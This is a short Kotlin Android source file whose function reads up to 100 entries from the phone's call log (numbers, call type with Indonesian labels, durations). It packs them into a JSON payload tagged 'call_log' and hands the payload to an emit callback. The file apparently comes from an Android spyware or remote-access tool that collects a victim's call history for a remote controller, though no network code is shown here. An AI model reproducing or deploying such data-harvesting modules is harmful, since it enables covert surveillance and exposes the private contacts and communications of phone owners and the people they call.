package com.app.cyber

import android.content.Context
import android.provider.CallLog
import org.json.JSONArray
import org.json.JSONObject

object CallRechive {
    fun sendAllCalls(ctx: Context, emit: (JSONObject) -> Unit) {
        val list = JSONArray()
        val cursor = ctx.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION),
            null, null,
            CallLog.Calls.DATE + " DESC"
        )
        
        cursor?.use {
            val numCol = it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
            val typeCol = it.getColumnIndexOrThrow(CallLog.Calls.TYPE)
            val durCol = it.getColumnIndexOrThrow(CallLog.Calls.DURATION)
            
            while (it.moveToNext() && list.length() < 100) {
                val obj = JSONObject()
                obj.put("number", it.getString(numCol) ?: "Unknown")
                
                val typeInt = it.getInt(typeCol)
                val typeStr = when (typeInt) {
                    CallLog.Calls.INCOMING_TYPE -> "Masuk"
                    CallLog.Calls.OUTGOING_TYPE -> "Keluar"
                    else -> "Terlewat"
                }
                
                obj.put("type", typeStr)
                obj.put("duration", it.getInt(durCol))
                list.put(obj)
            }
        }
        
        val payload = JSONObject()
        payload.put("action", "call_log")
        payload.put("data", list)
        emit(payload)
    }
}
